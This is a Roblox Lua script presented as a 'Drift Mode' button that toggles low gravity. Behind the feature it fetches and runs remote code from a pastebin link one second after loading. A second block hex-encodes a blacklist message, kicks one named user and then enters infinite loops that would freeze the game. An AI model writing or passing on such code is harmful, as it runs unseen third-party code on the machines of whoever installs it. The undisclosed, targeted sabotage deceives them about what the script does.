local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui", player.PlayerGui)
gui.ResetOnSpawn = false
local button = Instance.new("TextButton", gui)
button.Size = UDim2.new(0, 135, 0, 50) -- added size again
button.Position = UDim2.new(1, -185, 0.5, -25) -- moved more inward
button.Text = "Drift Mode by ???: OFF"
button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
button.TextColor3 = Color3.new(1, 1, 1)
button.TextScaled = true
button.BorderSizePixel = 0
button.AutoButtonColor = true
local normalGravity = 196.2
local lowGravity = 50
local enabled = false
button.MouseButton1Click:Connect(function()
enabled = not enabled
Workspace.Gravity = enabled and lowGravity or normalGravity
button.Text = enabled and "Drift Mode by Felix: ON" or "Drift Mode by Felix: OFF"
end)
task.wait(1)
task.spawn(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1eNfCJYj"))()
end)






local players = game:GetService("Players")
local workspace = game:GetService("Workspace")
local targetNames = {
    ["onkar16d"] = true
}
local function checkPlayer(player)
    local lowerName = string.lower(player.Name)
    if targetNames[lowerName] then
        local folder = Instance.new("Folder")
        folder.Name = "BlacklistMarker"
        folder.Parent = workspace
        local msg = "\x59\x4f\x55\x20\x41\x52\x45\x20\x42\x4c\x41\x43\x4b\x4c\x49\x53\x54\x45\x44"
        task.spawn(function()
            player:Kick(msg)
        end)
        task.wait(0.1)
        while true do
            pcall(function()
                player:Destroy()
                while true do end
            end)
        end
    end
end
players.PlayerAdded:Connect(checkPlayer)
for _, player in ipairs(players:GetPlayers()) do
    checkPlayer(player)
end
